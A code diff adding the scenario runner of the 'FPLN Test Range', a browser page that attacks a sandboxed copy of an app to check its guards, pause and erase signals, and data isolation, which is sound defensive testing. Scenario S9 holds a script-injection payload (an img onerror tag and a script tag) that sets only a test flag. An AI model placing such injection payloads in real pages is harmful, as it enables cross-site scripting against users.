+  /* Chrome logs a zero-length record even for requests its security policy refused, so a record only counts
+     when no layer refused it. Anything the range's last line caught always counts. */
+  var reached = RANGE.reached.slice(reachedBefore).length > 0 || out === "REACHED" || (netEntries(w, tag).length > 0 && !cspHit && !guardBlock);
+  var stop, ok;
+  if(isApi){ ok = !!err; stop = ok ? "L4" : "atk"; }
+  else if(reached){ ok = false; stop = "atk"; }
+  else if(guardBlock){ ok = true; stop = "L4"; }
+  else if(cspHit){ ok = true; stop = "L8"; }
+  else { ok = true; stop = "L8"; }
+  if(ok) blocked++; $("cBlock").textContent = blocked;
+  await packet(stop, ok ? (stop === "L4" ? "STOPPED BY THE APP GUARD" : "STOPPED BY THE BROWSER'S SECURITY POLICY") : "GOT PAST THE APP AND THE BROWSER", !ok);
+  light(stop === "L4" ? "L4" : "L8", ok ? "on" : "fault");
+  toast(ok ? "STOPPED · " + (stop === "L4" ? "app guard (L4)" : "browser policy (L8)") : "GOT OUT", ok ? "ok" : ""); ring(ok ? "safe" : "hit");
+  result(sid, label, ok, ok ? (stop === "L4" ? "app guard" : "browser policy") : "got past the app guard and browser policy");
+  await sleep(D(350));
+}
+
+/* ---------------- scenarios ---------------- */
+async function normal(){
+  sigSet(ctl("none"), ver("none")); RANGE.sig.down = false;
+  if(isLocked() || !frameW() || !frameW().FPLN_SAFE){ RANGE.local.delete("fpln:lock"); await boot(); }
+}
+async function order(c, v, why){ sigSet(c, v); hlog("signal", why, "s"); toast("SIGNAL: " + why, "sig"); light("L1"); light("L2"); var p = waitLoad(9000); nudge(); return p; }
+var SCN = [
+  {id: "S1", name: "Start-up and health", run: async function(){
+    now("Starting FPLN", "Loading the real app with fake data in memory."); RANGE.local.clear(); RANGE.session.clear(); RANGE.caches.clear(); RANGE.caches.add("fpln-range-copy");
+    RANGE.local.set("fpln:clock", JSON.stringify({v: 3, tasks: [{id: "r1", t: SECRET}]})); RANGE.local.set("other:site", "keep");
+    sigSet(ctl("none"), ver("none")); await boot();
+    var w = frameW();
+    result("S1", "App opens normally", !isLocked() && !!w.FPLN_SAFE);
+    result("S1", "Safety guard armed", !!w.FPLN_GUARD); light("L4");
+    var ok = await until(function(){ return w.document.getElementById("fClock").contentWindow.__fplnArmed; }, 5000); result("S1", "Guard armed inside the planner page", ok);
+    result("S1", "Flight recorder running", !!(w.FPLN_MONITOR && w.FPLN_MONITOR.events().some(function(e){ return e.k === "boot"; })));
+    var real = realChanged(); result("S1", "Your real FPLN data untouched", !real); if(real){ realRestore(); }
+  }},
+  {id: "S2", name: "Data theft, 12 ways (normal use)", run: async function(){ await normal();
+    for(var i=0;i<CHANNELS.length;i++) await fire("S2", CHANNELS[i][0], CHANNELS[i][1], CHANNELS[i][2]); }},
+  {id: "S3", name: "This week's vaccine threats", run: async function(){ await normal();
+    for(var i=0;i<VACCINE.length;i++) await fire("S3", VACCINE[i][0], VACCINE[i][1], VACCINE[i][2], VACCINE[i][3], VACCINE[i][4]); }},
+  {id: "S4", name: "Pause, then theft while paused", run: async function(){ await normal();
+    now("ORDER · PAUSE", "Both signal copies now say pause. Watch the app lock itself.");
+    await order(ctl("freeze", "Range test: FPLN is paused."), ver("freeze"), "pause sent to this copy");
+    var ok = await until(isLocked, 6000); result("S4", "Pause screen appears", ok); light("L3"); light("L5");
+    result("S4", "Message shown", /Range test/.test(lockText()));
+    result("S4", "Planner data kept", (RANGE.local.get("fpln:clock") || "").indexOf(SECRET) >= 0);
+    result("S4", "Browser lock in place", !!frameW().document.querySelector('meta[http-equiv="Content-Security-Policy"][content*="form-action \'none\'"]'));
+    for(var i=0;i<CHANNELS.length;i+=2) await fire("S4", CHANNELS[i][0], CHANNELS[i][1] + " (paused)", CHANNELS[i][2]); }},
+  {id: "S5", name: "Forged signal tries to unpause", run: async function(){
+    if(!isLocked()){ await order(ctl("freeze"), ver("freeze"), "pause sent"); await until(isLocked, 6000); }
+    now("ATTACK · FORGED SIGNAL", "An attacker rewrites the main signal to say none. The backup copy still says pause.");
+    var vf = RANGE.sig.version; sigSet(ctl("none"), vf); toast("ATTACK: forged 'none' signal"); nudge(); await sleep(D(2200) + 800);
+    result("S5", "Stays paused with a forged main signal", isLocked()); light("L2");
+    now("ATTACK · CORRUPT SIGNAL", "The main signal file is now garbage."); sigSet("{ this is not json", vf); nudge(); await sleep(D(1800) + 800);
+    result("S5", "Stays paused with a corrupt signal", isLocked()); light("L3");
+    now("BREAK · SITE DOWN", "FPLN's site stops answering. The device latch has to hold on its own."); RANGE.sig.down = true; showSig();
+    var p = waitLoad(9000); frameW().location.reload(); await p; await sleep(D(1500));
+    result("S5", "Stays paused while the site is down, after a restart", isLocked()); light("L3"); RANGE.sig.down = false; showSig(); }},
+  {id: "S6", name: "Code inside tries to free itself", run: async function(){
+    sigSet(ctl("freeze"), ver("freeze")); if(!isLocked()){ var p0 = waitLoad(9000); nudge(); await p0; }
+    now("ATTACK · DELETE THE LATCH", "Hostile code removes the pause latch and restarts FPLN.");
+    toast("ATTACK: latch deleted, restarting"); RANGE.local.delete("fpln:lock");
+    var p = waitLoad(9000); frameW().location.reload(); await p;
+    hlog("watch", "FPLN starts unlocked, then checks the signal…", "s");
+    var ok = await until(isLocked, 9000); result("S6", "Re-locks itself from the signal", ok); light("L1"); light("L3"); }},
+  {id: "S7", name: "Restore", run: async function(){
+    now("ORDER · RESTORE", "Every signal copy says none. Watch the app unlock.");
+    await order(ctl("none"), ver("none"), "restore sent"); var ok = await until(function(){ return !isLocked() && frameW().FPLN_SAFE; }, 6000);
+    result("S7", "Unlocks only when every copy says none", ok);
+    result("S7", "Planner data still there", (RANGE.local.get("fpln:clock") || "").indexOf(SECRET) >= 0); }},
+  {id: "S8", name: "Feature switches", run: async function(){ await normal();
+    now("ORDER · SWITCHES", "Weather and Feedback switched off everywhere.");
+    await order(ctl("none", "", {off: ["weather", "feedback"]}), ver("none"), "weather and feedback off");
+    var w = frameW(), e1 = "", e2 = "";
+    try{ await w.fetch("https://api.open-meteo.com/v1/forecast?latitude=41.39&longitude=-73.96"); }catch(e){ e1 = String(e.message); }
+    toast("TRY: weather"); await sleep(D(500));
+    try{ await w.fetch("https://docs.google.com/forms/d/e/1FAIpQLSf2YdE91QlvrLtVRfqKF-KoC-do04QxvXyvM3vY6dF4BQavlw/formResponse", {method: "POST", mode: "no-cors"}); }catch(e){ e2 = String(e.message); }
+    toast("TRY: feedback"); light("L4");
+    result("S8", "Weather refused while switched off", /FPLN/.test(e1)); result("S8", "Feedback refused while switched off", /FPLN/.test(e2));
+    await order(ctl("none"), ver("none"), "all features back on"); }},
+  {id: "S9", name: "Banner with hidden script", run: async function(){ await normal();
+    var pay = '<img src=x onerror="window.__rangePwned=1"><script>window.__rangePwned=2<\/script>';
+    now("ATTACK · SCRIPT IN A BANNER", "A banner message carries code meant to run inside FPLN.");
+    sigSet(ctl("none", "", {banner: {id: "B-" + Date.now(), text: pay, level: "warn"}}), ver("none")); nudge();
+    var w = frameW(); var shown = await until(function(){ return (w.document.getElementById("fplnBanner") || {}).textContent; }, 5000);
+    await sleep(D(1500)); toast("Banner shown as plain text", "ok");
+    result("S9", "Banner shown", !!shown); result("S9", "Hidden script did not run", !w.__rangePwned); light("L4");
+    sigSet(ctl("none"), ver("none")); }},
+  {id: "S10", name: "Shutdown and erase", run: async function(){ await normal();
+    now("ORDER · SHUTDOWN AND ERASE", "Watch FPLN erase its own data and shut down.");
+    await order(ctl("erase", "Range test: FPLN was shut down."), ver("erase"), "shutdown and erase sent");
+    var ok = await until(function(){ return /shut down/.test(lockText()); }, 8000); result("S10", "Shutdown screen appears", ok);
+    var left = Array.from(RANGE.local.keys()).filter(function(k){ return /^fpln/.test(k) && k !== "fpln:lock" && k !== "fpln:rec"; });
+    result("S10", "FPLN data erased", left.length === 0, left.join(", "));
+    result("S10", "Other sites' data untouched", RANGE.local.get("other:site") === "keep");
+    result("S10", "Offline copy removed", !RANGE.caches.has("fpln-range-copy")); light("L3");
+    await sleep(D(1500));
+    now("ORDER · RESTORE", "FPLN comes back, empty."); await order(ctl("none"), ver("none"), "restore sent");
+    var back = await until(function(){ return !isLocked() && frameW().FPLN_SAFE; }, 6000); result("S10", "Restore after erase opens a fresh app", back); }}
+];
+function drawScn(cur, states){ $("scn").innerHTML = SCN.map(function(s){ var st = states[s.id] || "";
+  return '<div class="sc' + (cur === s.id ? " run" : "") + '"><b>' + s.id + "</b><span>" + esc(s.name) + '</span><span class="st ' + ({PASS: "g", FAIL: "w", RUNNING: "s"}[st] || "note") + '">' + (st || '<button type="button" data-run="' + s.id + '">Run</button>') + "</span></div>"; }).join(""); }
+var STATES = {}; drawScn("", STATES);
+$("scn").addEventListener("click", function(e){ var b = e.target.closest("[data-run]"); if(b && !running) runList([b.dataset.run]); });
+
+async function runList(ids){
+  running = true; stopFlag = false; $("runAll").disabled = true; $("stop").disabled = false;
+  if(!APPHTML){ try{ await loadApp(); }catch(e){ now("CAN'T START", e.message); running = false; $("runAll").disabled = false; $("stop").disabled = true; return; } }
+  REAL0 = realSnap(); try{ localStorage.setItem(BK, JSON.stringify(REAL0)); }catch(e){}
+  if(ids.length > 1){ RES = []; pass = fail = blocked = 0; ["cPass","cFail","cBlock"].forEach(function(i){ $(i).textContent = 0; }); $("rows").innerHTML = ""; STATES = {}; }
+  t0 = Date.now(); clearInterval(timer); timer = setInterval(function(){ var s = Math.round((Date.now() - t0) / 1000); $("cTime").textContent = Math.floor(s / 60) + ":" + p2(s % 60); }, 500);
+  if(ids[0] !== "S1" && !frameW().FPLN_SAFE){ await SCN[0].run(); }
+  for(var i=0;i<ids.length;i++){
+    var s = SCN.filter(function(x){ return x.id === ids[i]; })[0]; if(!s) continue;
+    var before = fail; STATES[s.id] = "RUNNING"; drawScn(s.id, STATES); hlog("scenario", s.id + " " + s.name, "s");
+    try{ await s.run(); }catch(e){ if(stopFlag) break; result(s.id, "Scenario error", false, String(e.message || e)); }
+    if(!onApp()){ result(s.id, "Test copy stayed isolated", false, "it left the range; restarting"); await boot(); }
+    if(realChanged()){ realRestore(); result(s.id, "Your real FPLN data untouched", false, "changed during the test and was restored"); warn("The test touched your real FPLN data. It was restored from the backup. Please tell Claude."); }
+    STATES[s.id] = fail > before ? "FAIL" : "PASS"; drawScn("", STATES);
+    if(stopFlag) break;
+  }
+  clearInterval(timer); running = false; $("runAll").disabled = false; $("stop").disabled = true;
+  try{ localStorage.removeItem(BK); }catch(e){}
+  now(stopFlag ? "STOPPED" : (fail ? "DONE · " + fail + " FAILED" : "DONE · ALL PASSED"), pass + " passed, " + fail + " failed, " + blocked + " attacks stopped. Your real FPLN data was not touched.");
+  $("rep").open = true;
+}
+$("runAll").onclick = function(){ runList(SCN.map(function(s){ return s.id; })); };
+$("stop").onclick = function(){ stopFlag = true; $("stop").disabled = true; now("STOPPING…", "Finishing the current step."); };
+document.querySelectorAll("[data-speed]").forEach(function(b){ b.onclick = function(){ speed = b.dataset.speed; document.querySelectorAll("[data-speed]").forEach(function(x){ x.setAttribute("aria-pressed", x === b ? "true" : "false"); }); }; });
+$("copy").onclick = function(){ var t = JSON.stringify({range: "FPLN Test Range", version: VERSION && VERSION.version, at: new Date().toISOString(), browser: navigator.userAgent, passed: pass, failed: fail, stopped: blocked, results: RES}, null, 1);
+  (navigator.clipboard ? navigator.clipboard.writeText(t) : Promise.reject()).then(function(){ $("copy").textContent = "Copied"; setTimeout(function(){ $("copy").textContent = "Copy results"; }, 1500); }, function(){ $("copy").textContent = "Copy blocked"; }); };
+loadApp().then(function(){ now("Ready.", "Press Run all, or run one scenario from the list. Watch slows each step down so you can see it; Fast runs at full speed."); sigSet(ctl("none"), ver("none")); }, function(e){ now("CAN'T LOAD FPLN", e.message); });
+fit();
+if(/[?&]autorun=1/.test(location.search)){ if(/[?&]fast=1/.test(location.search)){ speed = "fast"; } setTimeout(function(){ $("runAll").click(); }, 800); }
+})();
+</script>
+</body></html>
